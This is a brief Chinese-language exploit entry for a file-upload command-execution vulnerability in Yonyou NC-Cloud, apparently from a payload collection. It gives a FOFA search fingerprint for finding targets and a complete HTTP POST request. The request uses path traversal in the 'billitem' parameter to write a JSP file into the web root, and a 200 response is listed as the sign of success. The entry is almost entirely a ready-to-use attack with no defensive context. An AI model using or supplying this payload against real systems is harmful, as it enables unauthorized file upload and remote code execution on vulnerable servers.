# 用友NCfileupload命令执行漏洞

用友 ｜ 命令执行 ｜ —
- **指纹**：`app="用友-NC-Cloud"`

**Payload**
```
POST
/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&i
scover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C  HTTP/1.1
Host:
Content-Type: multipart/form-data;
boundary=d0b7a0d40eed0e32904c8017b09eb305
--d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file";  filename="we.jsp" Content-Type: text/plain
<%out.print("hello world");%>
--d0b7a0d40eed0e32904c8017b09eb305--
```
- **响应特征**：200